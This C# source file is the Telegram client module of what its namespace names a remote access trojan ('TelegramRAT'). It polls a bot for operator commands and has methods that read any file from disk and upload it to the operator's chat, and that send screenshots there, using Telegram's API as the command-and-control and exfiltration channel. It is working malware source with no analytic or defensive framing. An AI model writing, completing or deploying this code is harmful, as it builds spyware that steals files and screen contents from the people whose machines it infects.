namespace TelegramRAT.Telegram;

using System.Net.Http.Headers;
using System.Text;
using System.Text.Json;

internal sealed class TelegramClient
{
    private readonly string _botToken;
    private readonly HttpClient _http;
    private string ApiBase => $"https://api.telegram.org/bot{_botToken}";

    public TelegramClient(string botToken)
    {
        _botToken = botToken;
        _http = new HttpClient { Timeout = TimeSpan.FromSeconds(30) };
    }

    public async Task<List<TelegramUpdate>> GetUpdatesAsync(long offset)
    {
        var url = $"{ApiBase}/getUpdates?offset={offset}&timeout=10";
        var response = await _http.GetStringAsync(url);
        var doc = JsonDocument.Parse(response);

        var updates = new List<TelegramUpdate>();
        if (!doc.RootElement.GetProperty("ok").GetBoolean()) return updates;

        foreach (var result in doc.RootElement.GetProperty("result").EnumerateArray())
        {
            if (!result.TryGetProperty("message", out var message)) continue;

            updates.Add(new TelegramUpdate
            {
                UpdateId = result.GetProperty("update_id").GetInt64(),
                ChatId = message.GetProperty("chat").GetProperty("id").GetInt64(),
                Text = message.TryGetProperty("text", out var text) ? text.GetString() ?? "" : ""
            });
        }

        return updates;
    }

    public async Task SendTextAsync(long chatId, string text)
    {
        var payload = JsonSerializer.Serialize(new { chat_id = chatId, text, parse_mode = "Markdown" });
        var content = new StringContent(payload, Encoding.UTF8, "application/json");
        await _http.PostAsync($"{ApiBase}/sendMessage", content);
    }

    public async Task SendDocumentAsync(long chatId, string filePath)
    {
        using var form = new MultipartFormDataContent();
        form.Add(new StringContent(chatId.ToString()), "chat_id");

        var fileBytes = await File.ReadAllBytesAsync(filePath);
        var fileContent = new ByteArrayContent(fileBytes);
        fileContent.Headers.ContentType = new MediaTypeHeaderValue("application/octet-stream");
        form.Add(fileContent, "document", Path.GetFileName(filePath));

        await _http.PostAsync($"{ApiBase}/sendDocument", form);
    }

    public async Task SendPhotoAsync(long chatId, byte[] photoData, string? caption = null)
    {
        using var form = new MultipartFormDataContent();
        form.Add(new StringContent(chatId.ToString()), "chat_id");
        if (caption != null)
            form.Add(new StringContent(caption), "caption");

        var photoContent = new ByteArrayContent(photoData);
        photoContent.Headers.ContentType = new MediaTypeHeaderValue("image/jpeg");
        form.Add(photoContent, "photo", "screenshot.jpg");

        await _http.PostAsync($"{ApiBase}/sendPhoto", form);
    }

    public async Task SendInlineKeyboardAsync(long chatId, string keyboardJson)
    {
        var payload = JsonSerializer.Serialize(new
        {
            chat_id = chatId,
            text = "Select command:",
            reply_markup = JsonDocument.Parse(keyboardJson).RootElement
        });
        var content = new StringContent(payload, Encoding.UTF8, "application/json");
        await _http.PostAsync($"{ApiBase}/sendMessage", content);
    }
}

internal sealed class TelegramUpdate
{
    public long UpdateId { get; init; }
    public long ChatId { get; init; }
    public string Text { get; init; } = "";
}
